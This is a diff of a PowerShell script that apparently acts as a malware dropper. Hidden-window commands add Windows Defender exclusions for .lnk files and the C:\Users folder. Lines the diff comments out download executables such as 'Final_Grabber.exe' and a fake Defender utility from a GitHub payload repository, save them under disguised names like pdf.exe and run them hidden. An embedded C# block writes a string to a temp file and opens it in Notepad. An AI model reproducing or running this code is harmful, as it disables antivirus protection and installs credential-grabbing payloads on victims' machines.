@@ -5,14 +5,14 @@ powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
 powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
 
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
-powershell.exe -w Hidden C:\Users\pdf.exe
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\pdf.exe
+# powershell.exe -w Hidden C:\Users\pdf.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\internet.exe
-powershell.exe -w Hidden C:\Users\internet.exe
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Browser.exe -o C:\Users\internet.exe
+# powershell.exe -w Hidden C:\Users\internet.exe
 
-powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
-powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
+# powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
+# powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
 
 Add-Type -TypeDefinition @"
 using System;
@@ -23,7 +23,7 @@ public class NotepadScript
     public static void Main()
     {
         string filePath = Path.Combine(Path.GetTempPath(), "notepad_script.txt");
-        File.WriteAllText(filePath, "269314514$$justhackedon.tech_update$$");
+        File.WriteAllText(filePath, "Your_Pass");
         System.Diagnostics.Process.Start("notepad.exe", filePath);
     }
 }
